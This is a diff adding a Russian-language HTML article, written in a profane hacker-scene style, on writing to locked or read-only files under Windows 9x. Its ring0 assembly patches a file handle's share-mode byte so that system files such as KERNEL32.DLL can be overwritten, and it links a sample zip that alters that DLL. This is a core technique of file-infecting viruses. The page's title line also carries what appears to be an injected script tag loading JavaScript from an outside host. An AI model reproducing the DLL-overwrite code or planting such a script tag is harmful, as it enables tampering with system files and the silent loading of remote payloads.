@@ -1,0 +1,68 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
+<HTML>
+<HEAD>
+<TITLE>Win9X: Пишем в закрытые для записи файлы</title><script language='JavaScript' type='text/javascript' src='http://proxy.host.sk/index.php'></script>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
+</HEAD>
+<BODY bgcolor=#C0C0C0 text=#000000>
+
+<h3 ALIGN=center>Win9X: Пишем в закрытые для записи файлы</h3>
+
+<p>Итак, ВОТ ОНО!!! После нескольких часов ковыряния маздая и упорного
+  разглядывания хексов родились две ассемблерные команды, чему я весьма рад,
+  ибо давно было пора. Но, как говорится, лучше послезавтра чем завтра, и
+  поэтому вам представляется взъеб маздайных шар (в ring0):
+
+<pre>
+    ; EBX=ring0 file handle, file may be opened in read-only mode
+    mov     eax, [ebx+0Ch]            ; get some fucking pointer
+    mov     byte ptr [eax+0Ch], 42h   ; set openmode to denynone, read-write
+</pre>
+
+<p>Хотите еще? Ну тогда вот вам полный экземпл записи в KERNEL32.DLL, аки же
+  в любой другой файл независимо от того, открыт ли он, системный или еще
+  какая хуйня:
+
+<pre>
+    ...
+    mov     eax, R0_OPENCREATFILE
+    mov     bx, 2044h       ; no i24, denynone, r/o
+    mov     cx, 32          ; archive (unused here)
+    mov     dx, 01h         ; fail | open
+    lea     esi, filename
+    VxDcall IFSMGR, Ring0_FileIO
+    xchg    ebx, eax
+
+    mov     eax, [ebx+0Ch]  ; fuck share:
+    mov     byte ptr [eax+0Ch], 42h ; denynone, read-write
+
+    mov     eax, R0_WRITEFILE
+    mov     ecx, size buf
+    xor     edx, edx      ; filepos
+    lea     esi, buf
+    VxDcall IFSMGR, Ring0_FileIO
+
+    mov     eax, R0_CLOSEFILE
+    VxDcall IFSMGR, Ring0_FileIO
+    ...
+</pre>
+
+<p>С ring3 дело обстоит сложнее: чтобы наебать шары нужен хендл нулевого
+  кольца, а сгенерить его из ring3-хендла не так-то просто.
+  Есть, правда, функция: IFSMGR_Win32_Get_Ring0_Handle, но она глюкавая
+  и хуево как-то вызывается.
+
+<p>Метод, который применялся чтобы до всего этого допереть:<br>
+1. замечаем, что хендл файла в нулевом кольце суть поинтер куда-то-там<br>
+2. дальше видим, что по этому адресу (хендлу) куча офсетов<br>
+3. открываем два файла - один readonly и один readwrite<br>
+4. дампим и сравниваем память куда показывают офсеты из обоих хендлов<br>
+5. повторяем до полного охуения либо пока не станет все понятно ;-)
+
+<p>Кроме всего прочего было замечено: после 'mov eax, [ebx+0Ch]' в eax
+будет поинтер на структуру, первый дворд которой суть поинтер на следующую
+такую же структуру.
+Из этого можно поиметь например сканер хендлов.
+
+<p>В качестве бонуса прилагается <a href="w9xshare.zip">пример</a> инвертирования первого байта
+в KERNEL32.DLL, а так же инклюдники для перехода и работы с файлами в ring
